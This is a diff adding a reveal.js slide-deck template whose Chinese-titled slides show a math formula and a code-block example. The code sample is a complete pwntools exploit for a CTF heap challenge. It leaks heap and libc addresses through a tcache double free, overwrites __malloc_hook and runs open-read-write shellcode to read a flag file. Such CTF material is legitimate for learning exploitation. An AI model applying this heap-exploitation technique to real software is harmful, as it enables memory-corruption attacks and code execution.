@@ -1,0 +1,160 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>reveal.js</title>
+
+		<link rel="stylesheet" href="dist/reset.css">
+		<link rel="stylesheet" href="dist/reveal.css">
+		<link rel="stylesheet" href="dist/theme/black.css">
+
+		<!-- Theme used for syntax highlighted code -->
+		<link rel="stylesheet" href="plugin/highlight/monokai.css">
+	</head>
+  <body>
+	<div class="reveal">
+	  <div class="slides">
+	    <section data-markdown data-separator="<!--s-->" data-separator-vertical="<!--v-->">
+		  <textarea data-template>
+
+<!-- .slide: data-background="white" -->
+# Reveal.js
+<!--s-->
+<!-- .slide: data-background="white" -->
+## 幻灯片结构
+
+<!--v-->
+<!-- .slide: data-background="white" -->
+## 数学公式
+$$
+\left( \sum_{k=1}^n a_k b_k \right)^2 \leq \left( \sum_{k=1}^n a_k^2 \right) \left( \sum_{k=1}^n b_k^2 \right)
+$$
+
+<!--v-->
+<!-- .slide: data-background="white" -->
+## 代码块
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context(arch='amd64', os='linux', log_level='debug', encoding='latin1')
+context.terminal = ['tmux','splitw', '-h']
+s   = lambda content : p.send(content)
+sl  = lambda content : p.sendline(content)
+sa  = lambda content,send : p.sendafter(content, send)
+sla = lambda content,send : p.sendlineafter(content, send)
+rc  = lambda number : p.recv(number)
+ru  = lambda content : p.recvuntil(content)
+elf_path = './SWPUCTF_2019_p1KkHeap'
+libc_path = "/home/huayi/Desktop/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6"
+            #  ~/Desktop/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6
+
+elf = ELF(elf_path)
+libc = ELF(libc_path)
+
+if len(sys.argv) > 1 and sys.argv[1] == "r":
+    p = remote('node5.anna.nssctf.cn', 22056)
+else:
+    p = process(elf_path)
+def debug():
+    gdb.attach(p)
+    pause()
+
+
+def add(size):
+    sla(b'Choice: ', str(1))
+    sla(b'size:', str(size))
+def show(idx):
+    sla(b'Choice: ', str(2))
+    sla(b'id:', str(idx))
+def edit(idx, data):
+    sla(b'Choice: ', str(3))
+    sla(b'id:', str(idx))
+    sa(b'content:', data)
+def delete(idx):
+    sla(b'Choice: ', str(4))
+    sla(b'id:', str(idx))
+
+# leak heap_base
+add(0x100) #0
+add(0x100) #1
+# tcache->0->0
+delete(0)
+delete(0)
+show(0)
+ru(b'content: ')
+heap_base = u64(rc(6).ljust(8, b'\x00')) -0x360
+success("heap_base = "+hex(heap_base))
+
+# leak libc_base
+add(0x100) #2
+edit(2, p64(heap_base + 0x10))
+add(0x100) #3
+edit(4, b'\x07'*0x40)
+delete(3)
+show(3)
+pause()
+libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x70 - libc.sym['__malloc_hook']
+success("libc_base = "+hex(libc_base))
+pause()
+# orw
+malloc_hook = libc_base + libc.sym['__malloc_hook']
+buf = 0x66660000
+orw_sh = asm(shellcraft.open('./flag') + shellcraft.read(3, heap_base + 0x260, 0x30) + shellcraft.write(1, heap_base + 0x260, 0x30))
+edit(4, b'\x07'*0x40 + p64(malloc_hook) + p64(0)*5 + p64(buf))
+add(0x70) #5
+edit(5, orw_sh)
+add(0x10)
+edit(6, p64(buf))
+
+add(0x10)
+p.interactive()
+```
+
+<!--v-->
+<!-- .slide: data-background="white" -->
+## 示例程序
+
+<!--s-->
+<!-- .slide: data-background="white" -->
+## more
+
+
+		  </textarea>
+		</section>
+	  </div>
+	</div>   
+
+
+		<script src="dist/reveal.js"></script>
+		<script src="plugin/notes/notes.js"></script>
+		<script src="plugin/markdown/markdown.js"></script>
+		<script src="plugin/highlight/highlight.js"></script>
+		<script src="../plugin/math/math.js"></script>
+		<script>
+			// More info about initialization & config:
+			// - https://revealjs.com/initialization/
+			// - https://revealjs.com/config/
+			Reveal.initialize({
+				history: true,
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+				slideNumber: true,
+				transition: 'linear',
+
+				// Learn about plugins: https://revealjs.com/plugins/
+				plugins: [ 
+					RevealMarkdown, 
+					RevealHighlight, 
+					RevealNotes, 
+					RevealMath.KaTeX
+				]
+			});
+		</script>
+	</body>
+</html>
